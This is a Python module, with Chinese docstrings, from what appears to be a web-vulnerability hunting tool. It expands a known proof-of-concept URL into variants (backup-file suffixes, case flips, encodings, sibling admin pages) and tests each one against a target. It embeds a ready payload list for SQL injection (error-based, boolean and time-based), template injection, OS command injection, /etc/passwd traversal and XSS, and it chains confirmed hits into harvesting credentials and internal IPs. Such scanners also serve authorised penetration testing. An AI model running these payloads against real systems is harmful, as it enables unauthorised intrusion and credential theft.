"""持续挖掘 —— 已知 POC 扩展分析（POC → 变体 → 确定性复验 → 关联漏洞）。

给定已知 POC（URL + 请求描述 + 响应特征），确定性生成关联变体并逐一复验：
- 后缀变体：/backdoor.php → .bak/.old/.txt/.save/.swp/~/...
- 前缀变体：/.backdoor.php（编辑器/备份工具习惯）
- 大小写变体：路径段大小写互换（Windows/IIS 大小写不敏感场景）
- 参数值变体：query 值替换为高危探测值（' 、../ 、{{7*7}} 、{{1+1}}）
- 编码变体：单次/双重 URL 编码
- 同目录扩散：父目录下同类文件名 + 常见管理后缀

复验完全确定性：http_request（永不抛异常，失败 status=0 自动跳过）+
用户提供 match 特征（正则）判定；未提供特征时仅报告变体可达性 + 响应摘要。
命中且提供 match 的变体 → 直接产出可入库的确认漏洞（verified=True），
并对其响应内容继续跑 leak_exploit 提取子目标（持续挖掘闭环）。
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

from .http_client import http_request
from .leak_exploit import extract_followups

_SUFFIXES = (".bak", ".old", ".txt", ".save", ".swp", ".orig", ".copy", "~", ".1")
# 探测值变体：(payload, 自动命中判定正则)。expect 为空时仅靠 match_regex/响应差异判定。
_PROBE_VALUES = (
    ("1'", r"(SQL|syntax|unterminated|quote|mysql|odbc|jdbc|sqlite)"),
    ("1' AND extractvalue(1,concat(0x7e,user()))-- ", r"XPATH syntax error"),
    ("1' AND updatexml(1,concat(0x7e,database()),1)-- ", r"XPATH syntax error"),
    ("1 AND (SELECT 1 FROM (SELECT count(*),concat(floor(rand(0)*2),user())x FROM information_schema.tables GROUP BY x)a)", r"Duplicate entry"),
    ("-1 OR 1=1-- ", ""),
    ("' OR 1=1-- ", ""),
    ("1' AND IF(1=1,sleep(4),0)-- ", ""),
    ("1';WAITFOR DELAY '0:0:4'-- ", ""),
    ("%df%27 OR 1=1-- ", ""),
    ("{{7*7}}", r"\b49\b"),
    ("${7*7}", r"\b49\b"),
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("` id `", r"uid=\d+"),
    ("cat$IFS/etc/passwd", r"root:[x*]:0:0"),
    ("../../etc/passwd", r"root:[x*]:0:0"),
    ("<script>alert(1)</script>", r"<script>alert\(1\)"),
    ("<svg onload=alert(1)>", r"<svg onload"),
    ("1%2527", ""),
)
_MAX_VARIANTS = 120


@dataclass
class PocSpec:
    url: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)
    body: str = ""
    match_regex: str = ""          # 命中判定正则（用户提供）
    expect_regex: str = ""         # 探针自带预期证据正则（match_regex 缺省时兜底）
    note: str = ""


def parse_poc(text: str) -> PocSpec | None:
    """从 POC 描述文本提取基础请求（URL 必需，method/body 尽力解析）。"""
    if not text or not text.strip():
        return None
    url = ""
    method = "GET"
    body = ""
    # curl 命令解析（简版）
    curl_m = re.search(r"curl\s+(?:-\s*X\s*(\w+)\s+)?[\"']?(https?://[^\s\"']+)", text, re.IGNORECASE)
    if curl_m:
        method = (curl_m.group(1) or "GET").upper()
        url = curl_m.group(2)
        data_m = re.search(r"(?:--data(?:-raw)?|-d)\s*[\"']([^\"']+)[\"']", text, re.IGNORECASE)
        if data_m:
            body = data_m.group(1)
            if method == "GET":
                method = "POST"
    else:
        m = re.search(r"https?://[^\s\"'<>\\)]+", text)
        if not m:
            return None
        url = m.group(0).rstrip(".,;)")
        if re.search(r"\b(POST|PUT)\b", text, re.IGNORECASE):
            method = re.search(r"\b(POST|PUT)\b", text, re.IGNORECASE).group(1).upper()
    return PocSpec(url=url, method=method, body=body,
                   match_regex="", note=text.strip()[:500])


def expand_variants(poc: PocSpec) -> list[PocSpec]:
    """确定性生成关联变体（去重、限量）。"""
    out: list[PocSpec] = []
    seen = {poc.url}

    def add(u: str, note: str, expect: str = ""):
        if u not in seen and len(out) < _MAX_VARIANTS:
            seen.add(u)
            out.append(PocSpec(url=u, method=poc.method, headers=dict(poc.headers),
                               body=poc.body, match_regex=poc.match_regex,
                               expect_regex=expect, note=note))

    split = urlsplit(poc.url)
    base = f"{split.scheme}://{split.netloc}"
    path = split.path or "/"
    directory = path.rsplit("/", 1)[0] + "/"
    filename = path.rsplit("/", 1)[-1]

    # 1) 后缀变体（针对静态文件/脚本文件）
    if filename and "." in filename:
        for suf in _SUFFIXES:
            add(f"{base}{directory}{filename}{suf}", f"后缀变体 {suf}")

    # 2) 前缀点变体
    if filename:
        add(f"{base}{directory}.{filename}", "前缀点变体")

    # 3) 大小写变体（每段翻转一次，IIS/Windows 场景）
    segments = [s for s in path.split("/") if s]
    for i in range(len(segments)):
        flipped = segments[:i] + [segments[i].swapcase()] + segments[i + 1:]
        add(f"{base}/" + "/".join(flipped), f"大小写变体 #{i + 1}")

    # 4) 参数值变体（攻击探测探针，payload+预期证据）
    if split.query:
        pairs = parse_qsl(split.query, keep_blank_values=True)
        for probe, expect in _PROBE_VALUES:
            new_pairs = [(k, probe) for k, _ in pairs[:3]] or \
                [(pairs[0][0] if pairs else "id", probe)]
            q = urlencode(new_pairs)
            add(f"{base}{path}?{q}", f"探针 {probe[:24]}",
                expect=expect)

    # 5) 编码变体（对路径最后一段）
    if filename:
        add(f"{base}{directory}{quote(filename, safe='')}", "URL 编码变体")
        add(f"{base}{directory}{quote(quote(filename, safe=''), safe='')}", "双重编码变体")

    # 6) 同目录常见管理文件扩散
    for common in ("admin", "manager", "console", "debug", "install",
                   "phpinfo", "test", "info"):
        add(f"{base}{directory}{common}.php", f"同目录扩散 {common}.php")

    return out


async def run_poc_expand(target_url: str, poc_text: str, match_regex: str = "",
                         max_variants: int = 40) -> dict:
    """执行 POC 扩展分析：变体生成 → 逐个复验 → 结果分级。

    返回 {original_hit, variants: [...], confirmed: [...], followups: {...}}
    confirmed 中的变体满足：响应可达 + match_regex 命中（若提供）。
    """
    poc = parse_poc(poc_text)
    if not poc:
        return {"error": "未能从 POC 描述中解析出 URL（需包含 http(s):// 或 curl 命令）"}
    poc.match_regex = match_regex or ""

    # 原始 POC 验证
    orig = await _verify(poc)
    variants = expand_variants(poc)[:max_variants]

    results = []
    confirmed = []
    for v in variants:
        r = await _verify(v)
        results.append(r)
        if r["hit"]:
            confirmed.append(r)

    # 持续挖掘闭环：原始命中或确认变体的响应再提取子目标
    followups = {"urls": [], "creds": [], "private_ips": [], "notes": []}
    for hit in ([orig] if orig["hit"] else []) + confirmed:
        finding = {"url": hit["url"], "evidence": hit["snippet"],
                   "detail": hit["note"], "payload": ""}
        fu = extract_followups(finding, target_url)
        followups["urls"].extend(u for u in fu["urls"] if u not in followups["urls"])
        followups["creds"].extend(fu["creds"])
        followups["private_ips"].extend(fu["private_ips"])
        followups["notes"].extend(fu["notes"])

    return {
        "original_hit": orig,
        "variants_total": len(variants),
        "variants": results,
        "confirmed": confirmed,
        "followups": followups,
    }


async def _verify(poc: PocSpec) -> dict:
    """单变体确定性复验。"""
    r = await http_request(poc.method, poc.url, headers=poc.headers or None,
                           data=poc.body or None, timeout=10)
    reachable = r.status != 0
    hit = False
    rule = poc.match_regex or poc.expect_regex
    if reachable and rule:
        try:
            hit = re.search(rule, r.text or "", re.IGNORECASE) is not None
        except re.error:
            hit = False
    snippet = (r.text or "")[:400].replace("\n", " ")
    return {
        "url": poc.url, "method": poc.method, "status": r.status,
        "reachable": reachable, "hit": hit,
        "note": poc.note, "snippet": snippet,
        "elapsed_ms": r.elapsed,
    }
